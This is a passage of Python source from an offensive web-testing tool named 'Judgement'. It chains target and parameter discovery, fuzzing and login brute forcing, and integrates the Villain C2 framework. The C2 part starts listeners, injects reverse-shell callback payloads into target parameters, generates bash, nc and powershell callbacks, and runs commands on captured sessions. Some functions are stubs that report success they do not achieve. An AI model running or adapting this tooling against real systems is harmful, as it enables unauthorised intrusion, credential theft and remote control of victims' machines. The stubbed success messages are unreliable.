        <p>Informational: {len(severity_groups['info'])}</p>
        <p>Discovered targets: {len(targets)}</p>
        <p>Discovered parameters: {len(parameters)}</p>
        <p>Vulnerable fields: {len(vuln_fields)}</p>
    </div>
    
    <h2>Vulnerable Fields</h2>
    <table>
        <tr><th>URL</th><th>Parameter</th><th>Vulnerability Type</th><th>Confidence</th><th>Evidence</th></tr>
"""
        
        # Add vulnerable fields
        for field in vuln_fields:
            html_content += f"<tr><td>{field[2]}</td><td>{field[3]}</td><td>{field[4]}</td><td>{field[7]}</td><td>{field[6]}</td></tr>\n"
            
        html_content += """
    </table>
    
    <h2>Detailed Findings</h2>
"""
        
        # Add findings by severity
        for severity in ['high', 'medium', 'low', 'info']:
            if severity_groups[severity]:
                html_content += f"<h3>{severity.capitalize()} Severity Issues</h3>\n"
                html_content += "<table>\n"
                html_content += "<tr><th>Type</th><th>URL</th><th>Parameter</th><th>Evidence</th></tr>\n"
                
                for finding in severity_groups[severity]:
                    html_content += f"<tr><td>{finding[3]}</td><td>{finding[6]}</td><td>{finding[7] or 'N/A'}</td><td>{finding[9] or 'N/A'}</td></tr>\n"
                    
                html_content += "</table>\n"
                
        html_content += """
</body>
</html>
"""
        
        with open(output_file, 'w') as f:
            f.write(html_content)
            
        self.logger.log(f"HTML report saved to: {output_file}")
        return output_file
        
    def _count_status_codes(self, results):
        """Count occurrences of status codes"""
        status_counts = {}
        for result in results:
            code = result.get("status_code", "Unknown")
            status_counts[code] = status_counts.get(code, 0) + 1
        return status_counts

class JudgementOrchestrator:
    """Orchestrator for intelligent chaining of all components"""
    
    def __init__(self, config, logger, db_manager, wordlist_manager, payload_generator, villain_manager=None):
        self.config = config
        self.logger = logger
        self.db_manager = db_manager
        self.wordlist_manager = wordlist_manager
        self.payload_generator = payload_generator
        self.villain_manager = villain_manager
        self.reporter = ReportGenerator(logger, db_manager)
        self.active_listener_id = None
        
    def run_intelligent_assessment(self, initial_target):
        """Run a full intelligent security assessment with Villain C2 integration"""
        self.logger.log(f"Starting intelligent security assessment on {initial_target}")
        
        # Auto-start Villain listener if enabled
        if self.villain_manager and self.config.get("villain", {}).get("auto_start_listener", False):
            self.logger.log("[VILLAIN] Starting C2 listener...")
            self.active_listener_id = self.villain_manager.start_listener()
            if self.active_listener_id:
                self.logger.log(f"[VILLAIN] Listener {self.active_listener_id} active")
            else:
                self.logger.log("[VILLAIN] Failed to start listener", "ERROR")
        
        # Phase 1: Target Discovery
        self.logger.log("[PHASE 1] Target Discovery")
        target_discovery = IntelligentTargetDiscovery(self.config, self.logger, self.db_manager)
        discovered_targets = target_discovery.discover_targets(initial_target)
        
        # Phase 2: Parameter Discovery for each target
        self.logger.log("[PHASE 2] Parameter Discovery")
        all_parameters = []
        for target in discovered_targets:
            param_discovery = IntelligentParameterDiscovery(self.config, self.logger, self.db_manager)
            parameters = param_discovery.discover_parameters(target)
            all_parameters.extend(parameters)
            
        # Phase 3: Directory Fuzzing
        self.logger.log("[PHASE 3] Directory Fuzzing")
        all_fuzzing_results = []
        for target in discovered_targets:
            fuzzer = AdvancedFuzzer(self.config, self.logger, self.wordlist_manager, self.payload_generator, self.db_manager)
            results = fuzzer.fuzz_directories(target)
            all_fuzzing_results.extend(results)
            
        # Phase 4: Parameter Fuzzing
        self.logger.log("[PHASE 4] Parameter Fuzzing")
        all_param_fuzzing_results = []
        for target in discovered_targets:
            fuzzer = AdvancedFuzzer(self.config, self.logger, self.wordlist_manager, self.payload_generator, self.db_manager)
            results = fuzzer.fuzz_parameters(target, all_parameters)
            all_param_fuzzing_results.extend(results)
            
        # Phase 5: Brute Force Testing (if login forms found)
        self.logger.log("[PHASE 5] Brute Force Testing")
        all_bruteforce_results = []
        # In a real implementation, this would identify login forms and test them
        
        # Phase 6: Generate Comprehensive Report
        self.logger.log("[PHASE 6] Report Generation")
        scan_id = f"full_assessment_{int(time.time())}"
        html_report = self.reporter.generate_html_report(scan_id, initial_target)
        
        self.logger.log(f"Intelligent assessment complete. Report saved to: {html_report}")
        return {
            "targets": discovered_targets,
            "parameters": all_parameters,
            "directory_findings": all_fuzzing_results,
            "parameter_findings": all_param_fuzzing_results,
            "bruteforce_results": all_bruteforce_results,
            "report": html_report
        }

class JudgementCLI:
    """Professional CLI interface for Judgement"""
    
    def __init__(self):
        self.config = load_config()
        self.logger = Logger()
        self.db_manager = DatabaseManager()
        self.console = Console()
        
        # Initialize components
        self.seclists_manager = SecListsManager(self.config, self.logger)
        
        # Initialize Villain C2 manager if enabled
        self.villain_manager = None
        if self.config.get("villain", {}).get("enabled", False):
            self.villain_manager = VillainManager(self.config, self.logger)
            self.logger.log("Villain C2 framework initialized")
        
        self.wordlist_manager = WordlistManager(self.config, self.logger, self.seclists_manager)
        self.payload_generator = PayloadGenerator(self.config, self.logger, self.seclists_manager, self.villain_manager)
        self.reporter = ReportGenerator(self.logger, self.db_manager)
        self.orchestrator = JudgementOrchestrator(
            self.config, self.logger, self.db_manager, 
            self.wordlist_manager, self.payload_generator, self.villain_manager
        )
        
    def show_banner(self):
        """Display the Judgement banner"""
        banner = """
    .S   .S       S.    .S_sSSs      sSSSSs    sSSs   .S_SsS_S.     sSSs   .S_sSSs    sdSS_SSSSSSbs  
   .SS  .SS       SS.  .SS~YS%%b    d%%%%SP   d%%SP  .SS~S*S~SS.   d%%SP  .SS~YS%%b   YSSS~S%SSSSSP  
   S%S  S%S       S%S  S%S   `S%b  d%S'      d%S'    S%S `Y' S%S  d%S'    S%S   `S%b       S%S       
   S%S  S%S       S%S  S%S    S%S  S%S       S%S     S%S     S%S  S%S     S%S    S%S       S%S       
   S&S  S&S       S&S  S&S    S&S  S&S       S&S     S%S     S%S  S&S     S&S    S&S       S&S       
   S&S  S&S       S&S  S&S    S&S  S&S       S&S_Ss  S&S     S&S  S&S_Ss  S&S    S&S       S&S       
   S&S  S&S       S&S  S&S    S&S  S&S       S&S~SP  S&S     S&S  S&S~SP  S&S    S&S       S&S       
   S&S  S&S       S&S  S&S    S&S  S&S sSSs  S&S     S&S     S&S  S&S     S&S    S&S       S&S       
   d*S  S*b       d*S  S*S    d*S  S*b `S%%  S*b     S*S     S*S  S*b     S*S    S*S       S*S       
  .S*S  S*S.     .S*S  S*S   .S*S  S*S   S%  S*S.    S*S     S*S  S*S.    S*S    S*S       S*S       
sdSSS    SSSbs_sdSSS   S*S_sdSSS    SS_sSSS   SSSbs  S*S     S*S   SSSbs  S*S    S*S       S*S       
YSSY      YSSP~YSSY    SSS~YSSY      Y~YSSY    YSSP  SSS     S*S    YSSP  S*S    SSS       S*S       
                                                             SP           SP               SP        
                                                             Y            Y                Y         
        """
        self.console.print(Panel(banner, style="bold red"))
        self.console.print(Panel("[bold yellow]FOR AUTHORIZED SECURITY TESTING ONLY[/bold yellow]", style="yellow"))
        self.console.print("[cyan]Professional penetration testing automation with intelligent chaining[/cyan]\n")
        
    def main_menu(self):
        """Display main menu"""
        menu = Tree("[bold blue]Judgement Main Menu[/bold blue]")
        menu.add("[1] Intelligent Target Discovery")
        menu.add("[2] Parameter Discovery")
        menu.add("[3] Directory Fuzzing")
        menu.add("[4] Parameter Fuzzing")
        menu.add("[5] Brute Force Testing")
        menu.add("[6] Full Intelligent Assessment")
        menu.add("[7] View Reports")
        menu.add("[8] View Vulnerable Fields")
        menu.add("[9] Villain C2 Management")
        menu.add("[10] Configuration")
        menu.add("[11] Exit")
        self.console.print(menu)
        
    def config_menu(self):
        """Display configuration menu"""
        menu = Tree("[bold blue]Configuration Menu[/bold blue]")
        menu.add("[1] Scan Depth (Current: {})".format(self.config["scanning"]["depth"]))
        menu.add("[2] Thread Count (Current: {})".format(self.config["threads"]))
        menu.add("[3] Timeout (Current: {})".format(self.config["timeout"]))
        menu.add("[4] Delay (Current: {})".format(self.config["delay"]))
        menu.add("[5] Reporting Format (Current: {})".format(self.config["reporting"]["format"]))
        menu.add("[6] Villain C2 Settings (Enabled: {})".format(self.config.get("villain", {}).get("enabled", False)))
        menu.add("[7] Back to Main Menu")
        self.console.print(menu)
        
    def reports_menu(self):
        """Display reports menu"""
        menu = Tree("[bold blue]Reports Menu[/bold blue]")
        menu.add("[1] View Recent Scans")
        menu.add("[2] Generate HTML Report")
        menu.add("[3] Export Findings")
        menu.add("[4] Back to Main Menu")
        self.console.print(menu)
        
    def run(self):
        """Main execution loop"""
        self.show_banner()
        
        if not Confirm.ask("Do you have proper authorization for all targets?", default=False):
            self.console.print("[bold red]Access denied. Authorization required.[/bold red]")
            sys.exit(1)
            
        # Initialize SecLists
        self.seclists_manager.download_seclists()
        
        while True:
            self.main_menu()
            choice = Prompt.ask("Select option", choices=["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11"])
            
            if choice == "1":
                self.target_discovery()
            elif choice == "2":
                self.parameter_discovery()
            elif choice == "3":
                self.directory_fuzzing()
            elif choice == "4":
                self.parameter_fuzzing()
            elif choice == "5":
                self.brute_force_testing()
            elif choice == "6":
                self.full_assessment()
            elif choice == "7":
                self.view_reports()
            elif choice == "8":
                self.view_vuln_fields()
            elif choice == "9":
                self.villain_management()
            elif choice == "10":
                self.configuration()
            elif choice == "11":
                self.console.print("[bold green]Exiting Judgement. Happy hunting![/bold green]")
                break
                
    def target_discovery(self):
        """Perform target discovery"""
        self.console.print("\n[bold blue]Target Discovery[/bold blue]")
        target = Prompt.ask("Enter initial target URL")
        if not target.startswith(("http://", "https://")):
            target = "http://" + target
            
        discovery = IntelligentTargetDiscovery(self.config, self.logger, self.db_manager)
        targets = discovery.discover_targets(target)
        
        if targets:
            self.console.print(Panel("Discovered Targets", style="green"))
            for t in targets:
                self.console.print(f"  - {t}")
        else:
            self.console.print("[yellow]No additional targets discovered[/yellow]")
            
    def parameter_discovery(self):
        """Perform parameter discovery"""
        self.console.print("\n[bold blue]Parameter Discovery[/bold blue]")
        target = Prompt.ask("Enter target URL")
        if not target.startswith(("http://", "https://")):
            target = "http://" + target
            
        discovery = IntelligentParameterDiscovery(self.config, self.logger, self.db_manager)
        parameters = discovery.discover_parameters(target)
        
        if parameters:
            self.console.print(Panel("Discovered Parameters", style="green"))
            table = Table()
            table.add_column("Name", style="cyan")
            table.add_column("Type", style="magenta")
            table.add_column("Method", style="yellow")
            
            for param in parameters:
                table.add_row(
                    param["name"],
                    param["type"],
                    param["method"]
                )
            self.console.print(table)
        else:
            self.console.print("[yellow]No parameters discovered[/yellow]")
            
    def directory_fuzzing(self):
        """Perform directory fuzzing"""
        self.console.print("\n[bold blue]Directory Fuzzing[/bold blue]")
        target = Prompt.ask("Enter target URL")
        if not target.startswith(("http://", "https://")):
            target = "http://" + target
            
        fuzzer = AdvancedFuzzer(self.config, self.logger, self.wordlist_manager, self.payload_generator, self.db_manager)
        results = fuzzer.fuzz_directories(target)
        
        if results:
            report_file = self.reporter.generate_fuzzing_report(target, results)
            html_report = self.reporter.generate_html_report(fuzzer.scan_id, target)
            self.console.print(f"[green]JSON Report saved to: {report_file}[/green]")
            self.console.print(f"[green]HTML Report saved to: {html_report}[/green]")
            
            # Show top findings
            table = Table(title="Top Directory Findings")
            table.add_column("URL", style="cyan")
            table.add_column("Status", style="magenta")
            table.add_column("Size", style="yellow")
            
            for result in results[:10]:
                table.add_row(
                    result["url"],
                    str(result["status_code"]),
                    str(result["content_length"])
                )
            self.console.print(table)
        else:
            self.console.print("[yellow]No directories found[/yellow]")
            
    def parameter_fuzzing(self):
        """Perform parameter fuzzing"""
        self.console.print("\n[bold blue]Parameter Fuzzing[/bold blue]")
        target = Prompt.ask("Enter target URL")
        if not target.startswith(("http://", "https://")):
            target = "http://" + target
        
        # Option to include callback payloads
        use_callbacks = False
        if self.villain_manager:
            use_callbacks = Confirm.ask("Include callback payloads for C2 integration?", default=False)
            
            if use_callbacks:
                # Auto-start listener if not already running
                active_listeners = self.villain_manager.get_active_listeners()
                if not active_listeners:
                    self.console.print("[yellow]No active listeners found. Starting default listener...[/yellow]")
                    listener_id = self.villain_manager.start_listener()
                    if listener_id:
                        self.console.print(f"[green]Started listener {listener_id}[/green]")
                    else:
                        self.console.print("[red]Failed to start listener[/red]")
                        use_callbacks = False
                else:
                    self.console.print(f"[green]Using existing listeners: {list(active_listeners.keys())}[/green]")
            
        fuzzer = AdvancedFuzzer(self.config, self.logger, self.wordlist_manager, self.payload_generator, self.db_manager)
        
        # Set callback mode if enabled
        if use_callbacks:
            fuzzer.enable_callback_mode(self.villain_manager)
            
        results = fuzzer.fuzz_parameters(target)
        
        if results:
            report_file = self.reporter.generate_fuzzing_report(target, results)
            html_report = self.reporter.generate_html_report(fuzzer.scan_id, target)
            self.console.print(f"[green]JSON Report saved to: {report_file}[/green]")
            self.console.print(f"[green]HTML Report saved to: {html_report}[/green]")
            
            # Show findings
            table = Table(title="Parameter Fuzzing Results")
            table.add_column("URL", style="cyan")
            table.add_column("Parameter", style="magenta")
            table.add_column("Payload", style="yellow")
            table.add_column("Vulnerabilities", style="red")
            
            for result in results[:10]:  # Limit to top 10
                vulns = ", ".join(result.get("indicators", []))
                table.add_row(
                    result["url"],
                    result["parameter"],
                    result["payload"][:30] + "..." if len(result["payload"]) > 30 else result["payload"],
                    vulns
                )
            self.console.print(table)
            
            # Show callback status if enabled
            if use_callbacks:
                sessions = self.villain_manager.get_active_sessions()
                if sessions:
                    self.console.print(f"\n[bold green]C2 Sessions Established: {len(sessions)}[/bold green]")
                    for session_id, info in sessions.items():
                        self.console.print(f"  Session {session_id}: {info.get('client_ip', 'N/A')}")
                else:
                    self.console.print("\n[yellow]No C2 sessions established yet[/yellow]")
        else:
            self.console.print("[yellow]No vulnerabilities found[/yellow]")
            
    def brute_force_testing(self):
        """Perform brute force testing"""
        self.console.print("\n[bold blue]Brute Force Testing[/bold blue]")
        target = Prompt.ask("Enter login URL")
        if not target.startswith(("http://", "https://")):
            target = "http://" + target
            
        username = Prompt.ask("Enter username to test", default="admin")
        
        bruteforcer = DeepBruteForcer(self.config, self.logger, self.wordlist_manager, self.db_manager)
        results = bruteforcer.brute_force_login(target, username=username)
        
        if results:
            report_file = self.reporter.generate_bruteforce_report(target, results)
            html_report = self.reporter.generate_html_report(bruteforcer.scan_id, target)
            self.console.print(f"[green]JSON Report saved to: {report_file}[/green]")
            self.console.print(f"[green]HTML Report saved to: {html_report}[/green]")
            
            # Show credentials
            table = Table(title="Valid Credentials Found")
            table.add_column("Username", style="cyan")
            table.add_column("Password", style="magenta")
            table.add_column("Status", style="green")
            
            for result in results:
                table.add_row(
                    result["username"],
                    result["password"],
                    str(result["status_code"])
                )
            self.console.print(table)
        else:
            self.console.print("[yellow]No valid credentials found[/yellow]")
            
    def full_assessment(self):
        """Perform full intelligent assessment"""
        self.console.print("\n[bold blue]Full Intelligent Assessment[/bold blue]")
        target = Prompt.ask("Enter initial target URL")
        if not target.startswith(("http://", "https://")):
            target = "http://" + target
        
        # Villain C2 integration prompt
        use_villain = False
        if self.villain_manager:
            use_villain = Confirm.ask("Enable Villain C2 integration for this assessment?", default=True)
            if use_villain:
                self.console.print("[green]Assessment will include C2 callback payloads and automatic listener management[/green]")
        else:
            villain_prompt = Confirm.ask("Villain C2 is not enabled. Would you like to enable it for advanced callback payloads?", default=False)
            if villain_prompt:
                self.console.print("[yellow]Please configure Villain C2 in the Configuration menu first[/yellow]")
            
        results = self.orchestrator.run_intelligent_assessment(target)
        
        self.console.print(Panel("Assessment Complete", style="green"))
        self.console.print(f"Discovered targets: {len(results['targets'])}")
        self.console.print(f"Discovered parameters: {len(results['parameters'])}")
        self.console.print(f"Directory findings: {len(results['directory_findings'])}")
        self.console.print(f"Parameter findings: {len(results['parameter_findings'])}")
        self.console.print(f"Brute force results: {len(results['bruteforce_results'])}")
        self.console.print(f"Report saved to: {results['report']}")
        
        # Show C2 results if Villain was used
        if use_villain and self.villain_manager:
            sessions = self.villain_manager.get_active_sessions()
            if sessions:
                self.console.print(f"\n[bold green]C2 Sessions Established: {len(sessions)}[/bold green]")
                for session_id, info in sessions.items():
                    self.console.print(f"  Session {session_id}: {info.get('client_ip', 'N/A')} (Commands: {len(info.get('commands_executed', []))})")
                self.console.print("\n[cyan]Use 'Villain C2 Management' menu to interact with sessions[/cyan]")
            else:
                self.console.print("\n[yellow]No C2 sessions established during assessment[/yellow]")
        
    def view_reports(self):
        """View and manage reports"""
        while True:
            self.reports_menu()
            choice = Prompt.ask("Select option", choices=["1", "2", "3", "4"])
            
            if choice == "1":
                # Show recent scans
                self.console.print("[bold blue]Recent Scans[/bold blue]")
                # In a real implementation, this would query the database
                self.console.print("Recent scan data would be displayed here")
            elif choice == "2":
                # Generate HTML report
                scan_id = Prompt.ask("Enter scan ID")
                target = Prompt.ask("Enter target URL")
                html_report = self.reporter.generate_html_report(scan_id, target)
                self.console.print(f"[green]HTML Report saved to: {html_report}[/green]")
            elif choice == "3":
                # Export findings
                scan_id = Prompt.ask("Enter scan ID (or 'all' for all findings)")
                # In a real implementation, this would export findings to CSV/JSON
                self.console.print("[green]Findings exported successfully[/green]")
            elif choice == "4":
                break
                
    def view_vuln_fields(self):
        """View vulnerable fields"""
        self.console.print("\n[bold blue]Vulnerable Fields[/bold blue]")
        
        # Load from database
        vuln_fields = self.db_manager.get_vulnerable_fields()
        
        # Load from JSON file as backup
        if os.path.exists(VULN_FIELDS_FILE):
            try:
                with open(VULN_FIELDS_FILE, 'r') as f:
                    file_vuln_fields = json.load(f)
            except:
                file_vuln_fields = []
        else:
            file_vuln_fields = []
            
        # Combine both sources
        all_vuln_fields = vuln_fields + file_vuln_fields
        
        if all_vuln_fields:
            table = Table(title="Vulnerable Fields")
            table.add_column("URL", style="cyan")
            table.add_column("Parameter", style="magenta")
            table.add_column("Vulnerability Type", style="red")
            table.add_column("Confidence", style="yellow")
            table.add_column("Timestamp", style="blue")
            
            # If from database
            if isinstance(all_vuln_fields[0], tuple):
                for field in all_vuln_fields:
                    table.add_row(
                        field[2],  # URL
                        field[3],  # Parameter
                        field[4],  # Vulnerability type
                        str(field[7]),  # Confidence
                        field[8]   # Timestamp
                    )
            # If from JSON file
            else:
                for field in all_vuln_fields:
                    table.add_row(
                        field.get("url", "N/A"),
                        field.get("parameter_name", "N/A"),
                        field.get("vulnerability_type", "N/A"),
                        str(field.get("confidence", "N/A")),
                        field.get("timestamp", "N/A")
                    )
                    
            self.console.print(table)
        else:
            self.console.print("[yellow]No vulnerable fields found[/yellow]")
            
    def villain_management(self):
        """Manage Villain C2 framework"""
        if not self.villain_manager:
            self.console.print("[red]Villain C2 framework is not enabled[/red]")
            self.console.print("Enable it in configuration to use C2 features.")
            return
            
        while True:
            self.console.print("\n[bold blue]Villain C2 Management[/bold blue]")
            
            villain_menu = Tree("[bold blue]Villain C2 Menu[/bold blue]")
            villain_menu.add("[1] Start Listener")
            villain_menu.add("[2] View Active Listeners")
            villain_menu.add("[3] View Active Sessions")
            villain_menu.add("[4] Generate Callback Payloads")
            villain_menu.add("[5] Execute Command on Session")
            villain_menu.add("[6] View Evidence")
            villain_menu.add("[7] Stop Listener")
            villain_menu.add("[8] Back to Main Menu")
            self.console.print(villain_menu)
            
            choice = Prompt.ask("Select option", choices=["1", "2", "3", "4", "5", "6", "7", "8"])
            
            if choice == "1":
                self._start_listener()
            elif choice == "2":
                self._view_listeners()
            elif choice == "3":
                self._view_sessions()
            elif choice == "4":
                self._generate_callback_payloads()
            elif choice == "5":
                self._execute_command_on_session()
            elif choice == "6":
                self._view_evidence()
            elif choice == "7":
                self._stop_listener()
            elif choice == "8":
                break
                
    def _start_listener(self):
        """Start a new Villain listener"""
        port = Prompt.ask("Enter listener port", default=str(self.villain_manager.listener_port))
        interface = Prompt.ask("Enter interface", default="0.0.0.0")
        
        try:
            port = int(port)
            listener_id = self.villain_manager.start_listener(port, interface)
            
            if listener_id:
                self.console.print(f"[green]Listener {listener_id} started on {interface}:{port}[/green]")
            else:
                self.console.print("[red]Failed to start listener[/red]")
        except ValueError:
            self.console.print("[red]Invalid port number[/red]")
            
    def _view_listeners(self):
        """View active listeners"""
        listeners = self.villain_manager.get_active_listeners()
        
        if not listeners:
            self.console.print("[yellow]No active listeners[/yellow]")
            return
            
        table = Table(title="Active Listeners")
        table.add_column("Listener ID", style="cyan")
        table.add_column("Interface", style="magenta")
        table.add_column("Port", style="yellow")
        table.add_column("Status", style="green")
        table.add_column("Connections", style="blue")
        table.add_column("Start Time", style="white")
        
        for listener_id, info in listeners.items():
            table.add_row(
                listener_id,
                info.get("interface", "N/A"),
                str(info.get("port", "N/A")),
                info.get("status", "N/A"),
                str(info.get("connections", 0)),
                info.get("start_time", "N/A")
            )
            
        self.console.print(table)
        
    def _view_sessions(self):
        """View active sessions"""
        sessions = self.villain_manager.get_active_sessions()
        
        if not sessions:
            self.console.print("[yellow]No active sessions[/yellow]")
            return
            
        table = Table(title="Active Sessions")
        table.add_column("Session ID", style="cyan")
        table.add_column("Client IP", style="magenta")
        table.add_column("Client Port", style="yellow")
        table.add_column("Status", style="green")
        table.add_column("Commands", style="blue")
        table.add_column("Start Time", style="white")
        
        for session_id, info in sessions.items():
            table.add_row(
                session_id,
                info.get("client_ip", "N/A"),
                str(info.get("client_port", "N/A")),
                info.get("status", "N/A"),
                str(len(info.get("commands_executed", []))),
                info.get("start_time", "N/A")
            )
            
        self.console.print(table)
        
    def _generate_callback_payloads(self):
        """Generate and display callback payloads"""
        payload_type = Prompt.ask("Select payload type", 
                                choices=["bash", "python", "nc", "powershell", "php", "perl", "ruby"],
                                default="bash")
        
        payloads = self.villain_manager.generate_callback_payloads(payload_type)
        
        if payloads:
            self.console.print(f"\n[bold blue]{payload_type.title()} Callback Payloads[/bold blue]")
            
            for name, payload in payloads.items():
                panel = Panel(payload, title=name, style="cyan")
                self.console.print(panel)
        else:
            self.console.print("[yellow]No payloads generated[/yellow]")
            
    def _execute_command_on_session(self):
        """Execute command on an active session"""
        sessions = self.villain_manager.get_active_sessions()
        
        if not sessions:
            self.console.print("[yellow]No active sessions[/yellow]")
            return
            
        # Show available sessions
        self.console.print("\n[bold blue]Available Sessions:[/bold blue]")
        for session_id, info in sessions.items():
            self.console.print(f"  {session_id} - {info.get('client_ip', 'N/A')}")
            
        session_id = Prompt.ask("Enter session ID")
        
        if session_id not in sessions:
            self.console.print("[red]Invalid session ID[/red]")
            return
            
        command = Prompt.ask("Enter command to execute")
        
        success = self.villain_manager.execute_command_on_session(session_id, command)
        
        if success:
            self.console.print(f"[green]Command sent to session {session_id}[/green]")
        else:
            self.console.print("[red]Failed to execute command[/red]")
            
    def _view_evidence(self):
        """View captured evidence"""
        evidence_dir = "villain/evidence"
        
        if not os.path.exists(evidence_dir):
            self.console.print("[yellow]No evidence directory found[/yellow]")
            return
            
        evidence_files = [f for f in os.listdir(evidence_dir) if f.endswith(('.json', '.html'))]
        
        if not evidence_files:
            self.console.print("[yellow]No evidence files found[/yellow]")
            return
            
        self.console.print("\n[bold blue]Evidence Files:[/bold blue]")
        for i, filename in enumerate(evidence_files, 1):
            self.console.print(f"  [{i}] {filename}")
            
        try:
            choice = int(Prompt.ask("Select file to view (number)")) - 1
            
            if 0 <= choice < len(evidence_files):
                filepath = os.path.join(evidence_dir, evidence_files[choice])
                
                if filepath.endswith('.json'):
                    with open(filepath, 'r') as f:
                        data = json.load(f)
                    self.console.print(Panel(json.dumps(data, indent=2), title=evidence_files[choice]))
                else:
                    self.console.print(f"[cyan]HTML Report: {filepath}[/cyan]")
                    
            else:
                self.console.print("[red]Invalid selection[/red]")
        except ValueError:
            self.console.print("[red]Invalid number[/red]")
            
    def _stop_listener(self):
        """Stop a listener"""
        listeners = self.villain_manager.get_active_listeners()
        
        if not listeners:
            self.console.print("[yellow]No active listeners[/yellow]")
            return
            
        self.console.print("\n[bold blue]Active Listeners:[/bold blue]")
        for listener_id, info in listeners.items():
            self.console.print(f"  {listener_id} - {info.get('interface', 'N/A')}:{info.get('port', 'N/A')}")
            
        listener_id = Prompt.ask("Enter listener ID to stop")
        
        success = self.villain_manager.stop_listener(listener_id)
        
        if success:
            self.console.print(f"[green]Listener {listener_id} stopped[/green]")
        else:
            self.console.print("[red]Failed to stop listener or listener not found[/red]")
            
    def configuration(self):
        """Configuration menu"""
        while True:
            self.config_menu()
            choice = Prompt.ask("Select option", choices=["1", "2", "3", "4", "5", "6", "7"])
            
            if choice == "1":
                depth = Prompt.ask("Scan Depth", choices=["quick", "normal", "deep", "thorough"], default=self.config["scanning"]["depth"])
                self.config["scanning"]["depth"] = depth
                save_config(self.config)
                self.console.print(f"[green]Scan depth set to: {depth}[/green]")
            elif choice == "2":
                threads = int(Prompt.ask("Thread Count", default=str(self.config["threads"])))
                self.config["threads"] = threads
                save_config(self.config)
                self.console.print(f"[green]Thread count set to: {threads}[/green]")
            elif choice == "3":
                timeout = int(Prompt.ask("Timeout (seconds)", default=str(self.config["timeout"])))
                self.config["timeout"] = timeout
                save_config(self.config)
                self.console.print(f"[green]Timeout set to: {timeout} seconds[/green]")
            elif choice == "4":
                delay = float(Prompt.ask("Delay (seconds)", default=str(self.config["delay"])))
                self.config["delay"] = delay
                save_config(self.config)
                self.console.print(f"[green]Delay set to: {delay} seconds[/green]")
            elif choice == "5":
                format = Prompt.ask("Reporting Format", choices=["json", "html", "pdf"], default=self.config["reporting"]["format"])
                self.config["reporting"]["format"] = format
                save_config(self.config)
                self.console.print(f"[green]Reporting format set to: {format}[/green]")
            elif choice == "6":
                self._configure_villain()
            elif choice == "7":
                break
                
    def _configure_villain(self):
        """Configure Villain C2 settings"""
        self.console.print("\n[bold blue]Villain C2 Configuration[/bold blue]")
        
        current_enabled = self.config.get("villain", {}).get("enabled", False)
        enabled = Confirm.ask("Enable Villain C2 framework?", default=current_enabled)
        
        if not enabled:
            if "villain" not in self.config:
                self.config["villain"] = {}
            self.config["villain"]["enabled"] = False
            save_config(self.config)
            self.console.print("[yellow]Villain C2 framework disabled[/yellow]")
            return
        
        # Initialize villain config if not exists
        if "villain" not in self.config:
            self.config["villain"] = {
                "enabled": True,
                "default_host": "0.0.0.0",
                "default_port": 4444,
                "callback_url": "http://127.0.0.1:4444",
                "auto_start_listener": True,
                "evidence_capture": True,
                "session_timeout": 300
            }
        
        villain_config = self.config["villain"]
        villain_config["enabled"] = True
        
        # Configure settings
        host = Prompt.ask("Default listener host", default=villain_config.get("default_host", "0.0.0.0"))
        port = int(Prompt.ask("Default listener port", default=str(villain_config.get("default_port", 4444))))
        callback_url = Prompt.ask("Callback URL", default=f"http://{host}:{port}")
        auto_start = Confirm.ask("Auto-start listener?", default=villain_config.get("auto_start_listener", True))
        evidence_capture = Confirm.ask("Enable evidence capture?", default=villain_config.get("evidence_capture", True))
        
        villain_config.update({
            "default_host": host,
            "default_port": port,
            "callback_url": callback_url,
            "auto_start_listener": auto_start,
            "evidence_capture": evidence_capture
        })
        
        save_config(self.config)
        self.console.print("[green]Villain C2 configuration saved[/green]")
        
        # Reinitialize villain manager if needed
        if enabled and not self.villain_manager:
            self.villain_manager = VillainManager(self.config, self.logger)
            self.payload_generator = PayloadGenerator(self.config, self.logger, self.seclists_manager, self.villain_manager)
            self.orchestrator = JudgementOrchestrator(
                self.config, self.logger, self.db_manager, 
                self.wordlist_manager, self.payload_generator, self.villain_manager
            )
            self.console.print("[green]Villain C2 framework initialized[/green]")

def main():
    """Main execution function"""
    cli = JudgementCLI()
    cli.run()

if __name__ == "__main__":
    main()
